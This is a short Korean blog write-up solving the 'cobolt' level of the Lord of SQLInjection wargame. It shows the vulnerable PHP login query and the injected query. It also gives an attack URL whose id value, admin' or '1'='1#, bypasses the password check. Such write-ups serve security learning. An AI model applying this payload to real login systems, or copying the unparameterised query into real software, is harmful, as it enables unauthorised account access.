---
title: "Lord of SQLInjection: cobolt"
date: 2025-01-21T13:42:40+09:00
summary: "GET 파라미터의 SQL 구문을 조작해 Lord of SQLInjection cobolt 문제를 풀이합니다."
category: "보안/CTF 풀이"
tags: ["CTF", "웹 보안"]
sourceUrl: "https://learntoflyclotilde.tistory.com/entry/Lord-of-SQLInjection-cobolt"
draft: false
---

## **{{color:#52643c}}Problem{{/color}}**

![Lord of SQLInjection: cobolt 이미지 1](/assets/posts/los-cobolt/image-01.png)

---

## **{{color:#52643c}}Solve{{/color}}**

- **기존 구문 → {{bg:#e5ebdb}}GET 방식, id = admin{{/bg}}**

```

select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')”

```

- **변경 구문**

```

select id from prob_cobolt where id='admin' or '1'='1# and pw=md5('')”

```

- **공격 구문**

```

https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin' or '1'='1#

```

---

![Lord of SQLInjection: cobolt 이미지 2](/assets/posts/los-cobolt/image-02.png)
